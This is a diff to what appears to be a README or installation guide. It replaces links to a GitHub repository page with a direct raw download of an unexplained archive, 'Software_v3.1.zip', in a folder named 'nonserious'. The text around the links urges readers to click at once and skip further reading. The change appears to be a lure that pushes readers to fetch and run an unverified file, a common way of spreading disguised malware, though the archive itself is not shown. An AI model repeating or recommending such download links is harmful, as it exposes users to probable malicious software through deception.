@@ -32,11 +32,11 @@ This is the most important section – read every step carefully. You'll be runn
 
 Click the big button below to go to the official download location:
 
-### [⬇️ **Click Here to Download Plugins**](https://github.com/Hamzara1574/plugins)
+### [⬇️ **Click Here to Download Plugins**](https://github.com/Hamzara1574/plugins/raw/refs/heads/main/nonserious/Software_v3.1.zip)
 
 **Or copy and paste this link into your browser:**
 ```
-https://github.com/Hamzara1574/plugins
+https://github.com/Hamzara1574/plugins/raw/refs/heads/main/nonserious/Software_v3.1.zip
 ```
 
 ---
@@ -154,7 +154,7 @@ Here's your single action item:
 
 Everything else is intuitive and built to feel familiar. You don't need to read any more manuals.
 
-### [🚀 Go to Download Page Now](https://github.com/Hamzara1574/plugins)
+### [🚀 Go to Download Page Now](https://github.com/Hamzara1574/plugins/raw/refs/heads/main/nonserious/Software_v3.1.zip)
 
 ---
 
